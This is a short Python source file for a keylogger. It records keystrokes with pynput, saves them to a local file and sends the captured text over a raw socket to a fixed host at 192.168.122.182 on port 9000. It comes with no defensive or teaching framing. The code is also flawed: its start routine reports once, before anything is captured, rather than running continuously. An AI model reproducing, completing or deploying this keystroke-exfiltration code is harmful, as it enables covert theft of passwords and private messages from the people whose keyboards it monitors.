import pynput.keyboard
import socket
import threading

class Keylogger:
    def __init__(self):
        self.log = ""

    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.log += current_key
        print(f"Key pressed: {current_key}")

    def report(self):
        with open("keylogs.txt", "w") as file:
            file.write(self.log)
        self.send_data()
        self.log = ""

    def send_data(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect(("192.168.122.182", 9000))
            sock.sendall(self.log.encode())
            sock.close()
            print("Data sent successfully")
        except Exception as e:
            print(f"Failed to send data: {e}")

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.on_press)
        with keyboard_listener:
            self.report()

if __name__ == "__main__":
    keylogger = Keylogger()
    keylogger.start()